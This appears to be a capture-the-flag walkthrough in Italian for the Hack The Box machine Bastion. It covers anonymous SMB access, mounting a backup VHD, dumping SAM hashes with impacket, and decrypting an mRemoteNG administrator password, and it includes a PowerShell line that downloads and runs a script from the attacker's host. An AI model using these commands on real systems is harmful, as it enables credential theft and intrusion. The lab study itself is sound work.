@@ -1,0 +1,66 @@
+Solite porte aperte. Non c'è un web server
+Provo con smb, posso accedere a Backups
+Noto che è piena di file. Procedo quindi a fare un mount invece di scaricarli tutti uno ad uno
+sudo mount -t cifs //10.10.10.134/Backups mnt
+
+Avrei anche potuto usare smbmap, se da login error prova ad usare un qualsiasi username a caso che se c'è l'anonymous login va bene comunque
+smbmap -u aaaa -H 10.10.10.134
+
+note.txt dice che i file sono troppo pesanti.
+Posso controllare la pesantezza con 
+du -hs cartella
+
+Nella cartella Backup trovo file di tipo .vhd, so subito che saranno probabilmente quelli i file utili, .virtualharddrive
+
+Per mostrarli uso 7z
+7z l file.vhd
+
+Ci sono un sacco di file, monto per fare prima.
+per montare un file vhd si utilizza guestmount
+guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro (per read only) -v /home/sjay/Desktop/HTB/2CREST_CRT/9Bastion/vhd
+
+Nella cartella vado in Windows/System32/config
+Generalmente SAM e SYSTEM sono i file importanti
+
+Con quei due con l'istruzione
+impacket-secretsdump -sam SAM -system SYSTEM local
+
+Ottengo usernames e hashes delle password
+Provo l'accesso con le credenziali con smb
+smbmap -u L4mpje -p aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 -H 10.10.10.134
+
+Continuo a non avere accesso ad Admin ed il resto
+Posso provare con ssh visto che mi ricordo da nmap, decrypto la password
+È un hash quindi vado da hash.com
+
+Trovo bureaulampje
+Sono dentro, posso prendere la user flag
+
+PRIVESC
+
+Controllo con 
+net user l4mpje in che gruppo sono
+
+Voglio un tool per windows che si chiama JAWS.
+Vado nella cartella e avvio il solito python server
+Dalla macchina windows apro la powershell ed utilizzo la solita sintassi
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10:8000/jaws-enum.ps1') Per lanciarlo
+
+Mentre aspetto il tool, controllo i file e trovo mremoteNG che è un servizio vulnerabile
+Posso decifrare la password dell'administrator da quello. I log e config sono tenuti nella cartella AppData in Windows quindi vado in
+\Users\L4mpje\AppData
+
+Poi roaming e trovo mremoteng
+controllo confcons.xml e trovo quella dell'administrator
+Con quel tool
+
+python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2ktzO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
+
+
+E trovo la password
+Posso entrare con impacket-psexec
+impacket-psexec administrator@10.10.10.134
+
+Inserisco la password ed ho la flag
+Potevo entrare anche on ssh
+
